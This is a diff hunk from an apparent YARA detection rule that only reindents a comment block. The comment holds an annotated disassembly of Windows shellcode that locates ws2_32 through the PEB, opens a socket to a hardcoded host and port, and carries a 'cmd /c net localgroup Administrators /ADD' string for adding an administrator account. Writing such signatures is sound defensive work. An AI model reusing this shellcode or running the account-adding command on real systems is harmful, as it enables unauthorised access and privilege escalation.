@@ -6,80 +6,80 @@
     
         /*
             FC                   | .                    | cld
-        31DB                 | 1.                   | xor ebx,ebx
-        648B4330             | d.C0                 | mov eax,[fs:ebx+0x30]
-        8B400C               | .@.                  | mov eax,[eax+0xc]
-        8B501C               | .P.                  | mov edx,[eax+0x1c]
-        8B12                 | ..                   | mov edx,[edx]
-        8B7220               | .r                   | mov esi,[edx+0x20]
-        AD                   | .                    | lodsd
-        AD                   | .                    | lodsd
-        4E                   | N                    | dec esi
-        0306                 | ..                   | add eax,[esi]
-        3D32335F32           | =23_2                | cmp eax,0x325f3332
-        0F85EBFFFFFF         | ......               | jnz 0xd
-        8B6A08               | .j.                  | mov ebp,[edx+0x8]
-        8B453C               | .E<                  | mov eax,[ebp+0x3c]
-        8B4C0578             | .L.x                 | mov ecx,[ebp+eax+0x78]
-        8B4C0D1C             | .L..                 | mov ecx,[ebp+ecx+0x1c]
-        01E9                 | ..                   | add ecx,ebp
-        8B4158               | .AX                  | mov eax,[ecx+0x58]
-        01E8                 | ..                   | add eax,ebp
-        8B713C               | .q<                  | mov esi,[ecx+0x3c]
-        01EE                 | ..                   | add esi,ebp
-        03690C               | .i.                  | add ebp,[ecx+0xc]
-        53                   | S                    | push ebx
-        6A01                 | j.                   | push byte +0x1
-        6A02                 | j.                   | push byte +0x2
-        FFD0                 | ..                   | call eax
-        97                   | .                    | xchg eax,edi
-        68????????           | h....                | push dword 0x100007f	; Host
-        680200????           | h...\                | push dword 0x5c110002	; Port
-        89E1                 | ..                   | mov ecx,esp
-        53                   | S                    | push ebx
-        B70C                 | ..                   | mov bh,0xc
-        53                   | S                    | push ebx
-        51                   | Q                    | push ecx
-        57                   | W                    | push edi
-        51                   | Q                    | push ecx
-        6A10                 | j.                   | push byte +0x10
-        51                   | Q                    | push ecx
-        57                   | W                    | push edi
-        56                   | V                    | push esi
-        FFE5                 | ..                   | jmp ebp
-        636D64               | cmd                  | arpl [ebp+0x64],bp
-        650F885E000000       | e..^...              | gs js 0xc9
-        202F                 |  /                   | and [edi],ch
-        6320                 | c                    | arpl [eax],sp
-        6E                   | n                    | outsb
-        650F8415000000       | e......              | gs jz 0x8c
-        0F8564000000         | ..d...               | jnz 0xe1
-        650F820D000000       | e......              | gs jc 0x91
-        6D                   | m                    | insd
-        650F844A000000       | e..J...              | gs jz 0xd6
-        0F8355000000         | ..U...               | jnc 0xe7
-        6C                   | l                    | insb
-        6F                   | o                    | outsd
-        6970202F414444       | ip /ADD              | imul esi,[eax+0x20],dword 0x4444412f
-        2026                 |  &                   | and [esi],ah
-        26206E65             | & ne                 | and [es:esi+0x65],ch
-        0F8402000000         | ......               | jz 0xa9
-        6C                   | l                    | insb
-        6F                   | o                    | outsd
-        63616C               | cal                  | arpl [ecx+0x6c],sp
-        670F824D000000       | g..M...              | a16 jc 0x100
-        0F854A000000         | ..J...               | jnz 0x103
-        204164               |  Ad                  | and [ecx+0x64],al
-        6D                   | m                    | insd
-        696E6973747261       | inistra              | imul ebp,[esi+0x69],dword 0x61727473
-        0F8445000000         | ..E...               | jz 0x10f
-        0F8245000000         | ..E...               | jc 0x115
-        206D65               |  me                  | and [ebp+0x65],ch
-        0F842F000000         | ../...               | jz 0x108
-        0F833A000000         | ..:...               | jnc 0x119
-        6C                   | l                    | insb
-        6F                   | o                    | outsd
-        69702F41444400       | ip/ADD.              | imul esi,[eax+0x2f],dword 0x444441
+            31DB                 | 1.                   | xor ebx,ebx
+            648B4330             | d.C0                 | mov eax,[fs:ebx+0x30]
+            8B400C               | .@.                  | mov eax,[eax+0xc]
+            8B501C               | .P.                  | mov edx,[eax+0x1c]
+            8B12                 | ..                   | mov edx,[edx]
+            8B7220               | .r                   | mov esi,[edx+0x20]
+            AD                   | .                    | lodsd
+            AD                   | .                    | lodsd
+            4E                   | N                    | dec esi
+            0306                 | ..                   | add eax,[esi]
+            3D32335F32           | =23_2                | cmp eax,0x325f3332
+            0F85EBFFFFFF         | ......               | jnz 0xd
+            8B6A08               | .j.                  | mov ebp,[edx+0x8]
+            8B453C               | .E<                  | mov eax,[ebp+0x3c]
+            8B4C0578             | .L.x                 | mov ecx,[ebp+eax+0x78]
+            8B4C0D1C             | .L..                 | mov ecx,[ebp+ecx+0x1c]
+            01E9                 | ..                   | add ecx,ebp
+            8B4158               | .AX                  | mov eax,[ecx+0x58]
+            01E8                 | ..                   | add eax,ebp
+            8B713C               | .q<                  | mov esi,[ecx+0x3c]
+            01EE                 | ..                   | add esi,ebp
+            03690C               | .i.                  | add ebp,[ecx+0xc]
+            53                   | S                    | push ebx
+            6A01                 | j.                   | push byte +0x1
+            6A02                 | j.                   | push byte +0x2
+            FFD0                 | ..                   | call eax
+            97                   | .                    | xchg eax,edi
+            68????????           | h....                | push dword 0x100007f	; Host
+            680200????           | h...\                | push dword 0x5c110002	; Port
+            89E1                 | ..                   | mov ecx,esp
+            53                   | S                    | push ebx
+            B70C                 | ..                   | mov bh,0xc
+            53                   | S                    | push ebx
+            51                   | Q                    | push ecx
+            57                   | W                    | push edi
+            51                   | Q                    | push ecx
+            6A10                 | j.                   | push byte +0x10
+            51                   | Q                    | push ecx
+            57                   | W                    | push edi
+            56                   | V                    | push esi
+            FFE5                 | ..                   | jmp ebp
+            636D64               | cmd                  | arpl [ebp+0x64],bp
+            650F885E000000       | e..^...              | gs js 0xc9
+            202F                 |  /                   | and [edi],ch
+            6320                 | c                    | arpl [eax],sp
+            6E                   | n                    | outsb
+            650F8415000000       | e......              | gs jz 0x8c
+            0F8564000000         | ..d...               | jnz 0xe1
+            650F820D000000       | e......              | gs jc 0x91
+            6D                   | m                    | insd
+            650F844A000000       | e..J...              | gs jz 0xd6
+            0F8355000000         | ..U...               | jnc 0xe7
+            6C                   | l                    | insb
+            6F                   | o                    | outsd
+            6970202F414444       | ip /ADD              | imul esi,[eax+0x20],dword 0x4444412f
+            2026                 |  &                   | and [esi],ah
+            26206E65             | & ne                 | and [es:esi+0x65],ch
+            0F8402000000         | ......               | jz 0xa9
+            6C                   | l                    | insb
+            6F                   | o                    | outsd
+            63616C               | cal                  | arpl [ecx+0x6c],sp
+            670F824D000000       | g..M...              | a16 jc 0x100
+            0F854A000000         | ..J...               | jnz 0x103
+            204164               |  Ad                  | and [ecx+0x64],al
+            6D                   | m                    | insd
+            696E6973747261       | inistra              | imul ebp,[esi+0x69],dword 0x61727473
+            0F8445000000         | ..E...               | jz 0x10f
+            0F8245000000         | ..E...               | jc 0x115
+            206D65               |  me                  | and [ebp+0x65],ch
+            0F842F000000         | ../...               | jz 0x108
+            0F833A000000         | ..:...               | jnc 0x119
+            6C                   | l                    | insb
+            6F                   | o                    | outsd
+            69702F41444400       | ip/ADD.              | imul esi,[eax+0x2f],dword 0x444441
         */
     
         strings:
